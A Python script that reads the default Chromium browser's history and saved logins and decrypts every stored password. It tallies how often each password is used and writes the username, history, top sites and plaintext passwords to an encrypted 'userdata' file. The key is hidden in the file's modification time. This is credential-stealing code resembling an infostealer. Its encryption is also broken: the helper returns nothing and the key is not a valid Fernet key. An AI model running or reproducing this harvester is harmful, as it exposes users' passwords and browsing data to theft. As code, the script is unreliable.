import sys
import os
import json

# used for fernet encryption
import time
from cryptography.fernet import Fernet
import base64
import struct

import chromiumBrowser
import dataComprehention
import getBrowser

chromiumParams = getBrowser.getChromiumParams()
defaultBrowser = chromiumBrowser.Chromium(chromiumParams[0], chromiumParams[1], chromiumParams[2], chromiumParams[3])

#googleChrome = chromiumBrowser.Chromium("LOCALAPPDATA", "Default", "Google\\Chrome\\User Data", "GoogleChrome")
#microsoftEdge = chromiumBrowser.Chromium("LOCALAPPDATA", "Default", "Microsoft\\Edge\\User Data", "MicrosoftEdge")
#operaGX = chromiumBrowser.Chromium("APPDATA", "", "Opera Software\\Opera GX Stable", "OperaGX")

history = defaultBrowser.getHistory()
loginData = defaultBrowser.getLoginData()

passwordsAndFreq = {}
for login in loginData:
    url = login["origin_url"]
    username = login["username_value"]
    ciphertext = login["password_value"]

    if url == "" or username == "": continue
    secretKey = defaultBrowser.getSecretKey()
    password = defaultBrowser.decryptPassword(ciphertext, secretKey)
    if password == '': continue

    if password in passwordsAndFreq.keys(): passwordsAndFreq[password] += 1
    else: passwordsAndFreq[password] = 1
    #print(password)

#print(passwordsAndFreq)

topWebsites = dataComprehention.topWebsitesVisited(history)
#print(topWebsites)

# clear the temp folder to remove clutter
defaultBrowser.cleanup()


username = os.getlogin()
outputFilePath = os.path.join(sys.argv[1], "userdata")

key = round(time.time())
floatBytes = struct.pack("!d", key)
b64Key = base64.urlsafe_b64encode(floatBytes)
print( key )

print(b64Key)

def encryptString(key, inputString):
    encrypter = Fernet( key )
    bytes = encrypter.encrypt(inputString.encode())

with open(outputFilePath, "w") as f:
    f.writelines([
        encryptString(b64Key, username), "\n",
        encryptString(b64Key, json.dumps( history )), "\n",
        encryptString(b64Key, json.dumps( topWebsites )), "\n",
        encryptString(b64Key, json.dumps( passwordsAndFreq )), "\n",
    ])

# Sets the date modified so the key is present and changes everytime encrypted
os.utime(outputFilePath, (key, key))